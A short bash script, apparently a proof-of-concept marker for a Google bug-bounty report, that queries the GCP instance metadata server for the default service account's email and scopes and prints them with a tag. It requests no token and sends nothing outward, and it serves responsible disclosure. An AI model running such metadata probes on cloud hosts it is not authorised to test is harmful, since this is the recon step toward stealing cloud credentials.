#!/bin/bash
# Harmless marker for Google VRP issue 582019927.
# Reads only the worker's service account email and scopes.
# It does not request a token and does not read any secret.
M="http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default"
get() { curl -s --noproxy '*' --max-time 5 -H 'Metadata-Flavor: Google' "$M/$1" | tr '\n' ' '; }
echo "VRP-582019927-MARKER service_account=$(get email)"
echo "VRP-582019927-MARKER scopes=$(get scopes)"
exit 1
